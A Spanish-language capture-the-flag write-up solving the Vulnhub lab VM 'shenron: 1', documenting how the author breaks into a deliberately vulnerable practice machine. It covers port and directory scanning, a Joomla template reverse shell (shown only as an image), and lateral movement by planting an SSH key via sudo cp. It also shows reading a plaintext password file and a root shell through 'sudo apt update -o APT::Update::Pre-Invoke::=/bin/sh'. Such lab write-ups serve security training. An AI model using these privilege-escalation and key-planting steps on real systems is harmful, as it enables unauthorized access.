+++
title = 'shenron: 1 - Vulnhub'
+++

[link => shenron: 1](https://www.vulnhub.com/entry/shenron-1,630/)

---


## Escaneo de red con nmap para descubrir máquina objetivo

```bash
nmap -sn 10.38.1.0/24
```

![nmaphd](/images/writeups/vulnhub/shenron1/nmaphd.png)

### La IP de la máquina objetivo es **10.38.1.19**

## Escaneo de la máquina objetivo en busca de puertos abiertos

```bash
sudo naabu -host 10.38.1.19 -o host_scan.naabu
```

```bash
                  __
  ___  ___  ___ _/ /  __ __
 / _ \/ _ \/ _ \/ _ \/ // /
/_//_/\_,_/\_,_/_.__/\_,_/

                projectdiscovery.io

[INF] Running host discovery scan
[INF] Running SYN scan with CAP_NET_RAW privileges
10.38.1.19:22
10.38.1.19:80
[INF] Found 2 ports on host 10.38.1.19 (10.38.1.19)
```

### **Puertos Abiertos: 22,80**


## Ejecución de scripts con nmap

```bash
echo 10.38.1.19 | sudo naabu -nmap-cli 'nmap -sCV -oN scripts_exec.nmap'
```

```bash
                  __
  ___  ___  ___ _/ /  __ __
 / _ \/ _ \/ _ \/ _ \/ // /
/_//_/\_,_/\_,_/_.__/\_,_/

                projectdiscovery.io

[INF] Running host discovery scan
[INF] Running SYN scan with CAP_NET_RAW privileges
10.38.1.19:22
10.38.1.19:80
[INF] Found 2 ports on host 10.38.1.19 (10.38.1.19)
[INF] Running nmap command: nmap -sCV -oN scripts_exec.nmap -p 22,80 10.38.1.19 2736:af57:800:4500:28:0:4000:4006
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-19 11:56 EDT
Nmap scan report for 10.38.1.19
Host is up (0.00053s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 0e:22:60:0a:f7:d4:78:f6:42:08:d7:6a:6b:b0:b1:62 (RSA)
|   256 b3:0c:cd:0a:67:c3:ab:d2:23:27:02:1f:b2:fb:91:12 (ECDSA)
|_  256 29:73:e0:f2:6d:f6:fb:de:4c:6f:b2:7a:19:69:f5:82 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.41 (Ubuntu)
MAC Address: 08:00:27:36:AF:57 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.69 seconds
``` 

## Enumeración de directorios con gobuster

```bash
gobuster dir -u http://10.38.1.19/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt 
```

```bash
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.38.1.19/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/test                 (Status: 301) [Size: 307] [--> http://10.38.1.19/test/]
/joomla               (Status: 301) [Size: 309] [--> http://10.38.1.19/joomla/]
/server-status        (Status: 403) [Size: 275]
Progress: 207643 / 207644 (100.00%)
===============================================================
Finished
===============================================================
```

## Contraseña encontrada en el código fuente de la ruta http://10.38.1.19/test/password

![admin password](/images/writeups/vulnhub/shenron1/passwordadmin.png)


## Enumeración de subdirectorios de la ruta http://10.38.1.19/joomla/

```bash
gobuster dir -u http://10.38.1.19/joomla/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
```

```bash
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.38.1.19/joomla/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 316] [--> http://10.38.1.19/joomla/images/]
/templates            (Status: 301) [Size: 319] [--> http://10.38.1.19/joomla/templates/]
/media                (Status: 301) [Size: 315] [--> http://10.38.1.19/joomla/media/]
/modules              (Status: 301) [Size: 317] [--> http://10.38.1.19/joomla/modules/]
/bin                  (Status: 301) [Size: 313] [--> http://10.38.1.19/joomla/bin/]
/plugins              (Status: 301) [Size: 317] [--> http://10.38.1.19/joomla/plugins/]
/includes             (Status: 301) [Size: 318] [--> http://10.38.1.19/joomla/includes/]
/language             (Status: 301) [Size: 318] [--> http://10.38.1.19/joomla/language/]
/components           (Status: 301) [Size: 320] [--> http://10.38.1.19/joomla/components/]
/cache                (Status: 301) [Size: 315] [--> http://10.38.1.19/joomla/cache/]
/libraries            (Status: 301) [Size: 319] [--> http://10.38.1.19/joomla/libraries/]
/tmp                  (Status: 301) [Size: 313] [--> http://10.38.1.19/joomla/tmp/]
/layouts              (Status: 301) [Size: 317] [--> http://10.38.1.19/joomla/layouts/]
/administrator        (Status: 301) [Size: 323] [--> http://10.38.1.19/joomla/administrator/]
/cli                  (Status: 301) [Size: 313] [--> http://10.38.1.19/joomla/cli/]
Progress: 207643 / 207644 (100.00%)
===============================================================
Finished
===============================================================
```

## Reverse shell en código fuente de template protostar

![revshell protostar](/images/writeups/vulnhub/shenron1/revshellprotostar.png)

## Credenciales del usuario jenny

![Credenciales jenny](/images/writeups/vulnhub/shenron1/jennycredentials.png)

## Permisos sudo del usuario jenny

![sudo perms jenny](/images/writeups/vulnhub/shenron1/sudopermsjenny.png)

## ssh keygen

```bash
jenny@shenron:/home/jenny/.ssh$ ssh-keygen -t rsa
Generating public/private rsa key pair.
Enter file in which to save the key (/home/jenny/.ssh/id_rsa): 
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/jenny/.ssh/id_rsa
Your public key has been saved in /home/jenny/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:FV/qn+RCeZAkHF4x5Rr8reJ/F4rucl5A/qCFA9d4DTk jenny@shenron
The key's randomart image is:
+---[RSA 3072]----+
|         .+o*oo  |
|         .+Eo*   |
|       . oo+O..  |
|        o.=. * . |
|        So == + .|
|          +.+= + |
|         .  +o* .|
|         . +.+  o|
|          *+.....|
+----[SHA256]-----+
```

### Copiado del archivo authorized_keys a /home/shenron/.ssh/ y conexión por ssh

```bash
jenny@shenron:~/.ssh$ cp id_rsa.pub authorized_keys
jenny@shenron:~/.ssh$ ls
authorized_keys  id_rsa  id_rsa.pub  known_hosts
jenny@shenron:~/.ssh$ sudo -u shenron /usr/bin/cp authorized_keys /home/shenron/.ssh/
```
```bash
jenny@shenron:~/.ssh$ ssh shenron@10.38.1.19

shenron@shenron:~$ whoami
shenron
```

## Flag del usuario shenron

```bash
shenron@shenron:~$ ls
local.txt
shenron@shenron:~$ cat local.txt 
098b****************************
```

## Búsqueda de archivos pertenecientes al usuario shenron

```bash
shenron@shenron:~$ find /home -type f -user shenron
```

```bash
/var/opt/password.txt
``` 


```bash
shenron@shenron:~$ cat /var/opt/password.txt
shenron : YoUkNowMyPaSsWoRdIsToStRoNgDeAr
```

## Permisos sudo del usuario shenron 

![sudo perms shenron](/images/writeups/vulnhub/shenron1/sudopermsshenron.png)

## Ejecución de shell con apt

```bash
shenron@shenron:~$ sudo apt update -o APT::Update::Pre-Invoke::=/bin/sh

# whoami
root
```

## Flag del usuario root

```bash
# cat root.txt
                                                               
  mmmm  #                                                mmm   
 #"   " # mm    mmm   m mm    m mm   mmm   m mm            #   
 "#mmm  #"  #  #"  #  #"  #   #"  " #" "#  #"  #           #   
     "# #   #  #""""  #   #   #     #   #  #   #   """     #   
 "mmm#" #   #  "#mm"  #   #   #     "#m#"  #   #         mm#mm 
                                                               
Your Root Flag Is Here : aa087b**************************
```

